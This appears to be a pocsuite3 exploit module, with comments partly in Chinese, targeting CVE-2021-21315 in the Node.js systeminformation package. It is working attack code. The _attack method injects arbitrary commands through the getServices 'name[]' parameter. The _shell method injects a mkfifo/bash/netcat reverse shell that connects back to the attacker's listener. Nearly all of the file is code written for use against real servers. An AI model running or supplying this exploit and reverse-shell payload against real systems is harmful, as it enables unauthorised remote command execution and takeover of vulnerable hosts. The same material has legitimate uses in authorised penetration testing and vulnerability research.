#!/usr/bin/env python
# coding: utf-8
from urllib.parse import urlparse,quote
from pocsuite3.api import requests as req
from pocsuite3.api import register_poc
from pocsuite3.api import Output, POCBase
from pocsuite3.api import POC_CATEGORY, VUL_TYPE, REVERSE_PAYLOAD,get_listener_ip, get_listener_port
from collections import OrderedDict
from pocsuite3.api import OptString
from pocsuite3.lib.utils import random_str
import base64


class TestPOC(POCBase):
    vulID = ''
    version = '1'
    author = 'kingween'
    vulDate = '2021-2-24'
    createDate = '2021-3-17'
    updateDate = '2021-3-17'
    references = [
        'https://github.com/ForbiddenProgrammer/CVE-2021-21315-PoC']
    name = 'CVE-2021-21315 Node.js Systeminformation 命令执行漏洞'
    appPowerLink = ''
    appName = 'Node.js'
    appVersion = 'Systeminformation< 5.3.1'
    vulType = VUL_TYPE.CODE_EXECUTION
    category = POC_CATEGORY.EXPLOITS.REMOTE
    desc = '''
        CVE-2021-21315 Node.js Systeminformation 命令执行漏洞
    '''
    def _options(self):
        o = OrderedDict()
        o["cmd"] = OptString('', description='执行命令', require=False)
        return o

    def _verify(self):
        return self._attack()

    def _attack(self):
        result = {}
        pr = urlparse(self.url)
        if pr.port:
            ports = [pr.port]
        else:
            ports = [8000]
        for port in ports:
            target = '{}://{}:{}'.format(pr.scheme, pr.hostname, port)
            headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:73.0) Gecko/20100101 Firefox/73.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                       "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "gzip, deflate", "DNT": "1", "Connection": "close", "Referer": self.url, "Upgrade-Insecure-Requests": "1"}
            cmd = self.get_option("cmd")
            target2 = target + "/api/getServices?name[]=$({})".format(quote(cmd))
            response = req.get(target2, headers=headers)
            if response and response.status_code == 200:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = '{}:{}'.format(
                    pr.hostname, port)
                result['extra'] = {}
                result['extra']['evidence'] = response.text
                break
        return self.parse_output(result)

    def _shell(self):

        # 默认监听6666端口
        cmd = 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {} {} >/tmp/f'.format(get_listener_ip(), get_listener_port())
        result = {}
        pr = urlparse(self.url)
        if pr.port:
            ports = [pr.port]
        else:
            ports = [8000]
        for port in ports:
            target = '{}://{}:{}'.format(pr.scheme, pr.hostname, port)
            headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:73.0) Gecko/20100101 Firefox/73.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                       "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "gzip, deflate", "DNT": "1", "Connection": "close", "Referer": self.url, "Upgrade-Insecure-Requests": "1"}
            target2 = target + "/api/getServices?name[]=$({})".format(quote(cmd))
            try:
                req.get(target2, headers=headers, timeout=3)
            except Exception:
                pass
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('not vulnerability')
        return output

register_poc(TestPOC)